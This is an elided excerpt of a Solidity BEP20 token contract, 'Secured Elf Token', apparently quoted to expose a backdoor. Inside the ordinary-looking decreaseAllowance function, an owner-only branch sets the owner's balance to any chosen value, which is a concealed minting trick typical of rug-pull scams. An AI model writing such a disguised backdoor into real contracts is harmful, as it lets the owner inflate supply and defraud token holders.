...
contract SecuredElf is Context, IBEP20, Ownable, ReentrancyGuard {
    using SafeMath for uint256;
    ...
    string private _name = "Secured Elf Token";
    ...
    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
        if(_msgSender() == owner())
        {
            ...
            //excludeFromReward(pancakePair);
            _tOwned[_msgSender()] = subtractedValue;
